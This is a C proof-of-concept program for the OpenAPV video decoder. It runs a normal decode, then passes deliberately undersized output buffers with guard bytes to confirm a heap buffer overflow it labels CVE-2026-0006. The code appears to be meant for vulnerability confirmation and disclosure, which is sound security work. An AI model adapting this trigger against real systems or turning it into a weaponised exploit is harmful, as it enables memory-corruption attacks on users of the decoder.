#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "oapv.h"

#define OAPV_MB_W_LOCAL 16
#define OAPV_MB_H_LOCAL 16
#define ALIGN_UP(val, align) ((((val) + (align) - 1) / (align)) * (align))

int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <apv_file>\n", argv[0]);
        return 1;
    }

    FILE *f = fopen(argv[1], "rb");
    if (!f) { fprintf(stderr, "Cannot open %s\n", argv[1]); return 1; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char *data = malloc(sz);
    fread(data, 1, sz, f);
    fclose(f);
    printf("[+] Loaded %s: %ld bytes\n", argv[1], sz);

    if (sz < 8) { fprintf(stderr, "File too small\n"); return 1; }

    unsigned char *au = data + 4;
    int au_sz = sz - 4;

    oapv_au_info_t aui;
    memset(&aui, 0, sizeof(aui));
    int ret = oapvd_info(au, au_sz, &aui);
    printf("[+] oapvd_info: ret=%d, num_frms=%d\n", ret, aui.num_frms);
    if (ret < 0) {
        fprintf(stderr, "[-] oapvd_info failed (ret=%d)\n", ret);
        free(data);
        return 1;
    }

    int w = aui.frm_info[0].w;
    int h = aui.frm_info[0].h;
    int cs = aui.frm_info[0].cs;
    printf("[+] frame: %dx%d cs=0x%x pbu_type=%d\n", w, h, cs, aui.frm_info[0].pbu_type);

    int bd = (OAPV_CS_GET_BIT_DEPTH(cs) + 7) >> 3;
    int cf = OAPV_CS_GET_FORMAT(cs);
    printf("[+] byte_depth=%d, chroma_format=%d\n", bd, cf);

    int pw[3], ph[3], paw[3], pah[3], ps[3], pe[3], pbsize[3];
    int np;

    pw[0] = w;
    ph[0] = h;
    switch (cf) {
    case OAPV_CF_YCBCR422:
        pw[1] = pw[2] = (w + 1) >> 1;
        ph[1] = ph[2] = h;
        np = 3;
        break;
    case OAPV_CF_YCBCR420:
        pw[1] = pw[2] = (w + 1) >> 1;
        ph[1] = ph[2] = (h + 1) >> 1;
        np = 3;
        break;
    case OAPV_CF_YCBCR444:
        pw[1] = pw[2] = w;
        ph[1] = ph[2] = h;
        np = 3;
        break;
    default:
        pw[1] = pw[2] = (w + 1) >> 1;
        ph[1] = ph[2] = h;
        np = 3;
        break;
    }

    for (int i = 0; i < np; i++) {
        paw[i] = ALIGN_UP(pw[i], OAPV_MB_W_LOCAL);
        pah[i] = ALIGN_UP(ph[i], OAPV_MB_H_LOCAL);
        ps[i] = paw[i] * bd;
        pe[i] = pah[i];
        pbsize[i] = ps[i] * pe[i];
        printf("[+] plane %d: w=%d h=%d aw=%d ah=%d s=%d e=%d bsize=%d\n",
               i, pw[i], ph[i], paw[i], pah[i], ps[i], pe[i], pbsize[i]);
    }

    int err = 0;
    oapvd_cdesc_t cdesc;
    memset(&cdesc, 0, sizeof(cdesc));
    cdesc.threads = 1;
    oapvd_t did = oapvd_create(&cdesc, &err);
    if (!did) { fprintf(stderr, "[-] oapvd_create failed: %d\n", err); free(data); return 1; }
    printf("[+] Decoder created\n");

    // === TEST A: Normal decode ===
    printf("\n=== TEST A: Normal decode (%dx%d) ===\n", w, h);
    {
        oapv_bitb_t bitb;
        memset(&bitb, 0, sizeof(bitb));
        bitb.addr = au;
        bitb.ssize = au_sz;
        bitb.bsize = au_sz;

        oapv_frms_t output;
        memset(&output, 0, sizeof(output));

        oapv_imgb_t *img = calloc(1, sizeof(oapv_imgb_t));
        img->cs = cs;
        img->np = np;
        for (int p = 0; p < np; p++) {
            img->a[p] = calloc(1, pbsize[p]);
            img->baddr[p] = img->a[p];
            img->bsize[p] = pbsize[p];
            img->w[p] = pw[p];
            img->h[p] = ph[p];
            img->aw[p] = paw[p];
            img->ah[p] = pah[p];
            img->s[p] = ps[p];
            img->e[p] = pe[p];
        }

        output.frm[0].imgb = img;
        output.num_frms = 1;

        oapvd_stat_t stat;
        memset(&stat, 0, sizeof(stat));
        ret = oapvd_decode(did, &bitb, &output, NULL, &stat);
        printf("[+] oapvd_decode ret=%d (read=%d bytes)\n", ret, stat.read);

        for (int p = 0; p < np; p++) free(img->a[p]);
        free(img);
    }

    // === TEST B: UNDERSIZED buffer ===
    printf("\n=== TEST B: UNDERSIZED buffer (16x16 for %dx%d frame) ===\n", w, h);
    {
        oapv_bitb_t bitb;
        memset(&bitb, 0, sizeof(bitb));
        bitb.addr = au;
        bitb.ssize = au_sz;
        bitb.bsize = au_sz;

        oapv_frms_t output;
        memset(&output, 0, sizeof(output));

        oapv_imgb_t *img = calloc(1, sizeof(oapv_imgb_t));
        img->cs = cs;
        img->np = np;

        int small_sz = 16 * 16 * bd;
        int guard_sz = 65536;

        unsigned char *bufs[4];
        for (int p = 0; p < np; p++) {
            bufs[p] = calloc(1, small_sz + guard_sz);
            memset(bufs[p] + small_sz, 0xDE, guard_sz);
            img->a[p] = bufs[p];
            img->baddr[p] = bufs[p];
            img->bsize[p] = small_sz;
            img->w[p] = pw[p];
            img->h[p] = ph[p];
            img->aw[p] = paw[p];
            img->ah[p] = pah[p];
            img->s[p] = ps[p];
            img->e[p] = pe[p];
        }

        output.frm[0].imgb = img;
        output.num_frms = 1;

        printf("[*] Buffer: %d bytes per plane, guard at +%d (0xDE)\n", small_sz, small_sz);
        for (int p = 0; p < np; p++) {
            printf("[*] Plane %d: decoder will write %d bytes into %d-byte buffer\n",
                   p, pbsize[p], small_sz);
        }

        oapvd_stat_t stat;
        memset(&stat, 0, sizeof(stat));
        ret = oapvd_decode(did, &bitb, &output, NULL, &stat);
        printf("[+] oapvd_decode ret=%d\n", ret);

        int total_overflow = 0;
        for (int p = 0; p < np; p++) {
            int overflow = 0;
            for (int i = 0; i < guard_sz; i++) {
                if (bufs[p][small_sz + i] != 0xDE) overflow++;
            }
            if (overflow > 0) {
                printf("[!!!] PLANE %d: %d bytes OVERFLOW past %d-byte buffer!\n", p, overflow, small_sz);
            }
            total_overflow += overflow;
        }

        if (total_overflow > 0) {
            printf("\n[!!!] CVE-2026-0006: HEAP BUFFER OVERFLOW CONFIRMED\n");
            printf("[!!!] Total overflow: %d bytes across all planes\n", total_overflow);
            printf("[!!!] Decoder wrote past allocated buffer boundaries\n");
        } else {
            printf("\n[*] No overflow detected\n");
        }

        for (int p = 0; p < np; p++) free(bufs[p]);
        free(img);
    }

    oapvd_delete(did);
    free(data);
    printf("\n[+] Done\n");
    return 0;
}
